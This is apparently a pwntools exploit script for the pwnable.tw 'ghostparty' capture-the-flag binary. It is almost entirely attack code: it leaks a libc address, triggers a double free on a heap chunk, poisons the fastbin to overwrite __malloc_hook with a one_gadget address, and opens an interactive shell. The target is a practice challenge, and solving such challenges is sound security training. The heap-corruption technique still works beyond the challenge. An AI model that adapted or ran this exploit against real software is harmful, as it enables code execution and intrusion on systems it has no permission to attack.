from pwn import *

# io = remote('chall.pwnable.tw', 10401)
io = process('./ghostparty_patched')
libc = ELF('./libc_64.so.6')
bin = ELF('./ghostparty_patched')
context.clear(os='linux', arch='x86_64')#, log_level='debug')

def add_vampire(name, age, message, blood, action, final = False):
    io.recvuntil(b'Your choice :')
    io.sendline(b'1')
    io.recvuntil(b'Name : ')
    io.sendline(name)
    io.recvuntil(b'Age : ')
    io.sendline(str(age).encode())
    io.recvuntil(b'Message : ')
    io.sendline(message)
    io.recvuntil(b'Choose a type of ghost :')
    io.sendline(b'7')
    if final:
        return
    io.recvuntil(b'Add blood :')
    io.sendline(blood)
    io.recvuntil(b'Your choice : ')
    io.sendline(str(action).encode())

def add_skull(name, age, message, bones , action):
    io.recvuntil(b'Your choice :')
    io.sendline(b'1')
    io.recvuntil(b'Name : ')
    io.sendline(name)
    io.recvuntil(b'Age : ')
    io.sendline(str(age).encode())
    io.recvuntil(b'Message : ')
    io.sendline(message)
    io.recvuntil(b'Choose a type of ghost :')
    io.sendline(b'4')
    io.recvuntil(b'How many bones ? : ')
    io.sendline(str(bones).encode())
    io.recvuntil(b'Your choice : ')
    io.sendline(str(action).encode())

def add_mummy(name, age, message, bandage, action):
    io.recvuntil(b'Your choice :')
    io.sendline(b'1')
    io.recvuntil(b'Name : ')
    io.sendline(name)
    io.recvuntil(b'Age : ')
    io.sendline(str(age).encode())
    io.recvuntil(b'Message : ')
    io.sendline(message)
    io.recvuntil(b'Choose a type of ghost :')
    io.sendline(b'5')
    io.recvuntil(b'Commit on bandage : ')
    io.sendline(bandage)
    io.recvuntil(b'Your choice : ')
    io.sendline(str(action).encode())

def listghost(index):
    io.recvuntil(b'Your choice :')
    io.sendline(b'2')
    io.recvuntil(b'Choose a ghost which you want to show in the party : ')
    io.sendline(str(index).encode())
    io.recvuntil(b'Blood : ')
    return u64(io.recv(6) + b'\x00\x00')

def remove_ghost(index):
    io.recvuntil(b'Your choice :')
    io.sendline(b'4')
    io.recvuntil(b'Choose a ghost which you want to remove from the party : ')
    io.sendline(str(index).encode())

with open('/proc/%d/maps' % io.pid, 'r') as f:
    base = int('0x' + f.read(12), 16)
    log.info('PIE: %#x' % base)

def debug():
    gdb.attach(io, '''b*%d''' % (base + 0x6314))

add_vampire(b'A', 1, b'A', b'A' * 0x88, 1)
add_vampire(b'A', 1, b'A', b'\x01', 1)
libc.address = listghost(1) - 0x3c3b01
log.success('Libc base: %#x' % libc.address)

add_skull(b'A', 1, b'A', 0, 1)
debug()
add_vampire(b'A', 1, b'A', b'A' * 0x67, 3) # free name
remove_ghost(2)
remove_ghost(2) # free name again -> double free
remove_ghost(1)

malloc_hook = libc.address + 0x3c3aed
one_gadget = libc.address + 0xf0567

add_vampire(p64(malloc_hook).ljust(0x67, b'\0'), 1, b'A', b'A', 1)
add_vampire(b'A' * 0x67, 1, b'A', b'A', 1)
add_skull(b'A', 1, b'A', 0, 1) 

payload = b'\0' * 0x13 + p64(one_gadget)
# overwrite __malloc_hook with one gadget
add_vampire(payload.ljust(0x67, b'\00'), 1, b'', b'A', 1, True) # '' is used to make [rsp + 0x70] == 0

io.interactive()